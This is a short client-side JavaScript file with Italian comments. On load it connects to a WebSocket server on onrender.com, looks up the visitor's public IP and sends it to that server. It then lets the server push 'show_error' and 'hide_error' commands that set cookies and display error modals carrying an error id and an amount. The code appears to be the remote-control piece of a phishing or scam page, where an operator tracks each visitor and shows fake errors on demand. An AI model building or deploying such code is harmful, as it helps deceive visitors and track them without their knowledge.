window.ws = null;
let reconnectAttempts = 0;
const maxReconnectDelay = 30000;

function connectWebSocket() {
  window.ws = new WebSocket('wss://luna2dev-1.onrender.com/');

  window.ws.onopen = () => {
    console.log('[WS] Connessione aperta');
    reconnectAttempts = 0;

    // Se l'IP reale è già disponibile, invialo ora che la connessione è aperta
    if (window.realUserIp) {
      window.ws.send(JSON.stringify({
        type: 'register_real_ip',
        real_ip: window.realUserIp
      }));
    }
  };

  window.ws.onmessage = (event) => {
    console.log('[WS] Messaggio ricevuto:', event.data);
    try {
      const data = JSON.parse(event.data);

      if (data.command === 'show_error') {
        const errorId = data.payload?.error_id;
        const amount = data.payload?.amount;

        document.cookie = `error_id=${errorId}; path=/; max-age=86400`;
        document.cookie = `error_amount=${amount}; path=/; max-age=86400`;
        document.cookie = `show_pre_error=${true}; path=/; max-age=86400`;

        if (!errorId) {
          console.warn('[WS] Unknown or missing error_id:', errorId);
          return;
        }

        window.showErrorModal(errorId, amount, "N/A", true);
      } else if (data.command === 'hide_error') {
        window.hideErrorModal();
      }
    } catch (err) {
      console.error('[WS] Errore durante il parsing del messaggio:', err);
    }
  };

  window.ws.onerror = (err) => {
    console.error('[WS] Errore:', err);
  };

  window.ws.onclose = (event) => {
    console.warn(`[WS] Connessione chiusa (codice: ${event.code}, ragione: ${event.reason})`);
    reconnectAttempts++;
    const delay = Math.min(1000 * reconnectAttempts, maxReconnectDelay);
    console.log(`[WS] Riconnessione in ${delay / 1000}s...`);
    setTimeout(connectWebSocket, delay);
  };
}

// *** PASSO FONDAMENTALE: Chiama connectWebSocket() IMMEDIATAMENTE ***
// Questo avvia il tentativo di connessione WebSocket non appena lo script viene caricato.
connectWebSocket();

// Ottieni l'IP e avvia WebSocket (questa parte rimane asincrona)
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
    window.realUserIp = data.ip;
    console.log('[IP] IP utente reale:', window.realUserIp);
    // Se la connessione WebSocket è già aperta, invia l'IP ora.
    // Altrimenti, verrà inviato quando la connessione si aprirà (nel handler onopen).
    if (window.ws && window.ws.readyState === WebSocket.OPEN) {
      window.ws.send(JSON.stringify({
        type: 'register_real_ip',
        real_ip: window.realUserIp
      }));
    }
  })
  .catch(err => {
    console.warn('[IP] Impossibile ottenere l\'IP reale:', err);
    // La connessione WebSocket è già stata avviata dalla chiamata sopra.
  });
